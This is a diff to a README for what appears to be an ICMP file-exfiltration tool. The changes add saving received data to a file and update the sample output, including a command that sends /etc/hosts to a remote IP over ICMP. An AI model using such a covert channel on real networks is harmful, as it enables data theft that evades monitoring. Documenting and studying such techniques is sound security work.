@@ -25,7 +25,8 @@ The program works with two files.
 
 First one "icmp_exfiltration.py", this file we will use as a receiver by running this file we will automatically
 start listening for any "ICMP packets" that are coming towards our host machine, once we start receiving packets
-this script will automatically decode the message and print it to the display.
+this script will automatically decode the message and print it to the display and also in the same time the script
+will save the output to indicate file.
 
 Second file "icmp_sendData.py", with the help of this script we can send any type of file we want to another host 
 where it is listening for our communication, we just need to provide the destination "IP-Address" and "FILE NAME" 
@@ -50,8 +51,10 @@ to the script, and it will automatically convert our data into "HEXADECIMAL" and
 #### icmp_exfiltration.py
 ```bash
 ❯ sudo python3 icmp_exfiltration.py wlan0
-
-┃ [*] Listening for any incoming connections...
+                                                                                                                                                                                      
+┃  [*]  Listening for any incoming connections...                                                                                                                                         
+                                                                                                                                                                                          
+┃  [*]  Saving data to file 
 
 127.0.0.1       localhost
 127.0.1.1       Gurpreet06                        
@@ -62,9 +65,13 @@ First we run the "icmp_exfiltration.py" file specifying which interface we want 
 ```bash
 ❯ python3 icmp_sendData.py 172.16.223.1 /etc/hosts
 
-┃  [*] Trying to send file...
+┃  [*]  Hosts active,  Linux system
 
-┃  [*] File sent successfully.                        
+┃  [*]  Trying to send file..
+
+100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 720000/720000 [00:00<00:00, 4097689.59it/s]
+
+┃  [*]  File sent successfully
 ```
 Then from another host we will run the "icmp_sendData.py" script by providing the destination "IP-Address" and "FILE NAME"
 and it will automatically send  the file to another host terminal.
